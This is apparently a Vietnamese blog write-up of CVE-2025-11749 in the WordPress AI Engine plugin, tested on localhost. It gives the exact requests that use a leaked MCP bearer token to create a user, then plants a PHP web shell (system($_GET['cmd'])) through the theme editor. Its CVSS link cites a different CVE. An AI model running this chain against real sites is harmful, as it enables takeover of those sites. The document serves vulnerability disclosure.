---
layout: post
title:  "CVE-2025-11749 - Sensitive Data Disclosure lead to RCE Analysis"
date:   2025-11-06 10:25:56 +0700
categories: wordpress
---
# Info:

Type: Sensitive Data Disclosure

Plugin Name: AI Engine

Version: < 3.1.4

**Base Score:** [**9.8 CRITICAL**](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2024-38773&vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1&source=NIST)

**Vector:**  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

NIST: 

WPScan: [WPScan](https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4/)

# PoC:

## Setup

Cài đặt môi trường và plugin AI Engine theo hướng dẫn [tại đây](https://t0t0r0o.github.io/writeups/wordpress/2025/10/29/setup.html)

Sau khi cài thành công, thực hiện kích hoạt plugin sau đó thực hiện cấu hình theo các bước:

- B1: Chọn AI Engine trên tab menu
- B2: chọn tab Settings
- B3: Trong tab settings chọn tab MCP
- B4: Chọn  SSE Endpoint
- B5: Điền Bearer Token bất kì
- B6: Chọn No-Auth URL
- B7: tại MCP Features chọn Wordpress

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-1.png)

## Exploit

Từ vai trò khách không có tài khoản đăng nhập vào hệ thống ta có thể truy cập trực tiếp vào API `/mcp/v1/sse` .  Nội dung trả về sẽ là đường dẫn các API bao gồm cả Bearer Token mà quản trị viên đã tạo

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-2.png)

Sử dụng token lấy được để gửi request với mcp_ping để kiểm tra với request:

```
POST /index.php?rest_route=/mcp/v1/Test123/sse HTTP/1.1
Host: localhost:9000
Authorization: Bearer Test123
Content-Type: application/json
Content-Length: 130

{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "mcp_ping",
    "arguments": {}
  },
  "id": 1
}
```

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-3.png)

Sử dụng token để thực hiện tạo người dùng admin với request:

```
POST /index.php?rest_route=/mcp/v1/Test123/messages HTTP/1.1
Host: localhost:9000
Authorization: Bearer Test123
Content-Type: application/json
Content-Length: 313

{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "wp_create_user",
    "arguments": {
      "user_login": "admin2",
      "user_email": "admin2@example.com", 
      "user_pass": "123456@aA",
      "display_name": "New Admin 2",
      "role": "contributer"
    }
  },
  "id": 1
}
```

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-4.png)

Sử dụng tài khoản vừa tạo để đăng nhập

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-5.png)

Tại giao diện admin thực hiện theo các bước:

- B1: Chọn Công cụ tại thanh menu
- B2: Chọn Theme File Editor
- B3: Chọn theme Twenty Twenty Two
- B4: Bấm chọn
- B5: Chọn file index.php
- B6: chèn code system($_GET[’cmd’]);

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-6.png)

Thực hiện truyền shell trên đường dẫn `/wp-content/themes/twentytwentytwo/index.php?cmd=id`

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-7.png)